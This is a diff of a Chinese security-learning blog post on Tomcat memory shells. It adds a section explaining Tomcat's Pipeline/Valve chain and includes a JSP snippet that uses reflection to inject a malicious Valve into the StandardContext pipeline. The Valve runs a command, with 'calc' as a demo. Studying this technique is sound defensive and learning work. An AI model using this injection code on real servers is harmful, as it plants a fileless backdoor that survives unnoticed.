@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":30,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Filter型内存马调试前的准备首先配置环境和调试用的代码 新建java-web maven项目,在pom.xml中导入对应依赖 1234567891011121314151617181920212223242526272829303132333435&lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;junit&lt;&#x2F;g">
+  <meta name="description" content="tomcat内存马原理学习记录">
 <meta property="og:type" content="article">
 <meta property="og:title" content="tomcat内存马学习">
 <meta property="og:url" content="http://example.com/2022/04/17/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="blueSatchel&#39;s blog">
-<meta property="og:description" content="Filter型内存马调试前的准备首先配置环境和调试用的代码 新建java-web maven项目,在pom.xml中导入对应依赖 1234567891011121314151617181920212223242526272829303132333435&lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;junit&lt;&#x2F;g">
+<meta property="og:description" content="tomcat内存马原理学习记录">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417184815764.png">
 <meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417185013757.png">
@@ -53,8 +53,15 @@
 <meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420122055271.png">
 <meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420140012800.png">
 <meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420140848773.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172150621.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172202365.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172536815.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423173023450.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423173256592.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423171315008.png">
+<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423171440443.png">
 <meta property="article:published_time" content="2022-04-17T08:26:54.000Z">
-<meta property="article:modified_time" content="2022-04-21T06:54:44.310Z">
+<meta property="article:modified_time" content="2022-04-23T15:42:00.583Z">
 <meta property="article:author" content="blueSatchel">
 <meta property="article:tag" content="java">
 <meta property="article:tag" content="memshell">
@@ -253,7 +260,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-21 14:54:44" itemprop="dateModified" datetime="2022-04-21T14:54:44+08:00">2022-04-21</time>
+                <time title="修改时间：2022-04-23 23:42:00" itemprop="dateModified" datetime="2022-04-23T23:42:00+08:00">2022-04-23</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -287,6 +294,7 @@
   </span>
   
   
+            <div class="post-description">tomcat内存马原理学习记录</div>
 
         </div>
       </header>
@@ -297,7 +305,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h2><h5 id="调试前的准备"><a href="#调试前的准备" class="headerlink" title="调试前的准备"></a>调试前的准备</h5><p>首先配置环境和调试用的代码</p>
+        <blockquote>
+<p>参考引用</p>
+<p><a target="_blank" rel="noopener" href="https://javasec.org/javaweb/MemoryShell">https://javasec.org/javaweb/MemoryShell</a></p>
+</blockquote>
+<h2 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h2><h5 id="调试前的准备"><a href="#调试前的准备" class="headerlink" title="调试前的准备"></a>调试前的准备</h5><p>首先配置环境和调试用的代码</p>
 <p>新建java-web maven项目,在pom.xml中导入对应依赖</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--Servlet 依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JSP依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JSTL表达式的依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--standard标签库--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -339,7 +351,7 @@
 
 <p>FilterChain: 过滤器链,该对象上的doFilter方法能依次调用链上的Filter</p>
 <p>StandardContext: Context接口的标准实现类,一个Context代表一个Web应用,其下可以包含多个Wrapper(servlet)</p>
-<p>StandardWrapperValue: 一个Wrapper的标准实现类,一个Wrapper代表一个Servlet</p>
+<p>StandardWrapperValve: 一个Wrapper的标准实现类,一个Wrapper代表一个Servlet</p>
 <p>在StandardWrapperValue中会利用ApplicationFilterFactory来创建filterChain</p>
 <img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418152549816.png" alt="image-20220418152549816" style="zoom:67%;" />
 
@@ -499,6 +511,46 @@
 
 
 
+<h2 id="Valve-阀门-内存马"><a href="#Valve-阀门-内存马" class="headerlink" title="Valve(阀门)内存马"></a>Valve(阀门)内存马</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">tomcat管道与阀门原理讲解</a></p>
+<p>Tomcat在处理一个请求调用逻辑的时候,传递Request和Response对象使用了职责链模式</p>
+<p>Tomcat定义了两个接口Pipeline(管道)和Valve(阀门)</p>
+<p>Pipeline接口的实现类是<code>StandardPipeline</code></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172150621.png" alt="image-20220423172150621"></p>
+<p>Valve一般直接使用其实现类ValveBase</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172202365.png" alt="image-20220423172202365"></p>
+<p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 基础Valve之前，并按照添加顺序执行。</p>
+<p>首先要了解的是每一种<code>container</code>都有一个自己的<code>StandardValve</code>(也就是基础Value)</p>
+<ul>
+<li><p>StandardEngineValve</p>
+</li>
+<li><p>StandardHostValve</p>
+</li>
+<li><p>StandardContextValve</p>
+</li>
+<li><p>StandardWrapperValve</p>
+</li>
+</ul>
+<p>这些<code>Valve</code>会将接收到的数据扔给下一个<code>Container</code>的<code>Pipeline</code></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172536815.png" alt="image-20220423172536815"></p>
+<p>Pipeline就像一个工厂中的生产线，负责调配工人（valve）的位置，valve则是生产线上负责不同操作的工人。<br>一个生产线的完成需要两步：<br>1，把原料运到工人边上<br>2，工人完成自己负责的部分</p>
+<p>而tomcat的Pipeline实现是这样的：<br>1，在生产线上的第一个工人拿到生产原料后，二话不说就扔给下一个工人，下一个工人模仿第一个工人那样扔给下一个工人，直到最后一个工人，而最后一个工人被安排为上面提过的StandardValve，他要完成的工作居然是把生产资料运给自己包含的container的Pipeline上去。<br>2，四个container就相当于有四个生产线（Pipeline），四个Pipeline都这么干，直到最后的StandardWrapperValve拿到资源开始调用servlet。完成后返回来，一步一步的valve按照刚才丢生产原料是的顺序的倒序一次执行。如此才完成了tomcat的Pipeline的机制。</p>
+<p>代码调用的地方</p>
+<p>Adapter连接了Tomcat连接器<code>Connector</code>和容器<code>Container</code>它的实现类是<code>CoyoteAdapter</code>主要负责的是对请求进行封装,构造Request和Response对象.并将请求转发给Container也就是Servlet容器.</p>
+<p>在<code>CoyoteAdapter</code>的<code>service</code>方法中调用了valve的invoke方法</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423173023450.png" alt="image-20220423173023450"></p>
+<p>这里调用的是StandardEngineValve的invoke方法</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423173256592.png" alt="image-20220423173256592"></p>
+<p>它在最后调用了Host容器的第一个Valve的invoke方法,如此像一条链一样走到之前写恶意valve的地方</p>
+<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><p>在获取pipeline的时候有个小坑,我看见StandardContext在调试的时候有pipeline属性就以为它里面有这个属性,但是其实是在他继承的ContainerBase类里面呢</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423171315008.png" alt="image-20220423171315008"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423171440443.png" alt="image-20220423171440443"></p>
+<p>同时代码稍作修改,也可以往host或者wrapper中添加恶意Valve</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//首先获取context,往context的管道中添加恶意Valve</span></span><br><span class="line"></span><br><span class="line">    Field requestField = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    Request request1 =(Request) requestField.get(request);</span><br><span class="line">    StandardContext context =(StandardContext) request1.getContext();</span><br><span class="line">    <span class="comment">//    StandardHost standardHost = (StandardHost) request1.getHost();</span></span><br><span class="line">    <span class="comment">//    StandardWrapper standardWrapper = (StandardWrapper) request1.getWrapper();</span></span><br><span class="line">    Field pipelineField = ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardPipeline standardPipeline= (StandardPipeline) pipelineField.get(context);</span><br><span class="line">    <span class="comment">//   StandardPipeline standardPipeline2 = (StandardPipeline) pipelineField.get(standardHost);</span></span><br><span class="line">    <span class="comment">//   StandardPipeline standardPipeline3 = (StandardPipeline) pipelineField.get(standardWrapper);</span></span><br><span class="line"></span><br><span class="line">    ValveBase valveBase = <span class="keyword">new</span> ValveBase()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    standardPipeline.addValve(valveBase);</span><br><span class="line">    </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考引用</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/124120724">https://blog.csdn.net/Xxy605/article/details/124120724</a></p>
+</blockquote>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>花了不少时间看大佬的文章,才算将整个流程调试着跟下来并有了浅显的理解,如果不看大佬的分析,估计连有点地方入口在哪都找不到</p>
 <p>期间也感受到了基础知识对于看代码是有多么重要,就getClass这一点过去总是误解为它获取的都是当前类的class,还有就是英语也很重要,有时候点进去看个源码的注释,还是得靠英语</p>
 <p>加油吧!</p>
@@ -522,10 +574,13 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/04/01/swagger%E5%AD%A6%E4%B9%A0/" rel="prev" title="swagger学习">
-      <i class="fa fa-chevron-left"></i> swagger学习
+    <a href="/2022/03/31/cc7/" rel="prev" title="cc7">
+      <i class="fa fa-chevron-left"></i> cc7
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/21/spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" rel="next" title="spring内存马学习">
+      spring内存马学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -585,7 +640,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.</span> <span class="nav-text">Filter型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">调试前的准备</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#tomcat%E5%92%8Cservlet%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">tomcat和servlet的关系</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%B9%E5%99%A8%E7%BB%84%E4%BB%B6Container"><span class="nav-number">1.0.1.</span> <span class="nav-text">容器组件Container</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Engine"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">Engine</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Host"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">Host</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Context"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">Context</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Wrapper"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">Wrapper</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84%E7%B1%BB"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">一些会用到的类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0filter%E5%88%B0%E5%BD%93%E5%89%8Dcontext"><span class="nav-number">1.0.2.</span> <span class="nav-text">添加filter到当前context</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">小总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96standrandContext%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">获取standrandContext的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">1.1.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">1.1.2.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="nav-number">1.1.3.</span> <span class="nav-text">方法三</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B"><span class="nav-number">1.1.4.</span> <span class="nav-text">方法四</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94"><span class="nav-number">1.1.5.</span> <span class="nav-text">方法五</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">原理学习</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#servlet%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">2.</span> <span class="nav-text">servlet类型的内存马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">3.</span> <span class="nav-text">Listener型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.1.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.</span> <span class="nav-text">Filter型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">调试前的准备</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#tomcat%E5%92%8Cservlet%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">tomcat和servlet的关系</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%B9%E5%99%A8%E7%BB%84%E4%BB%B6Container"><span class="nav-number">1.0.1.</span> <span class="nav-text">容器组件Container</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Engine"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">Engine</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Host"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">Host</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Context"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">Context</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Wrapper"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">Wrapper</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84%E7%B1%BB"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">一些会用到的类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0filter%E5%88%B0%E5%BD%93%E5%89%8Dcontext"><span class="nav-number">1.0.2.</span> <span class="nav-text">添加filter到当前context</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">小总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96standrandContext%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">获取standrandContext的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">1.1.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">1.1.2.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="nav-number">1.1.3.</span> <span class="nav-text">方法三</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B"><span class="nav-number">1.1.4.</span> <span class="nav-text">方法四</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94"><span class="nav-number">1.1.5.</span> <span class="nav-text">方法五</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">原理学习</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#servlet%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">2.</span> <span class="nav-text">servlet类型的内存马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">3.</span> <span class="nav-text">Listener型内存马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Valve-%E9%98%80%E9%97%A8-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">4.</span> <span class="nav-text">Valve(阀门)内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">代码实现</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.1.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -601,7 +656,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-count">56</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
@@ -614,7 +669,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">58</span>
+        <span class="site-state-item-count">57</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
